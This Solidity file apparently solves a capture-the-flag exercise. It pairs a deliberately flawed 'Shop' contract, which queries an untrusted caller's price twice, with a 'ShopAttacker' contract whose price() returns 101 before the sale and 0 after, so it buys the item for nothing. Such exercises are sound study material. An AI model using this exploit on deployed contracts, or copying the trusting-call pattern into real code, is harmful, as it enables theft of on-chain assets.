// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopAttacker {
    Shop private _shop;

    constructor(address _shopAddress) public {
        _shop = Shop(_shopAddress);
    }

    function price() external view returns(uint256) {
        if(_shop.isSold() == false) {
            return 101;
        }
        return 0;
    }

    function buy() external {
        _shop.buy();
    }
}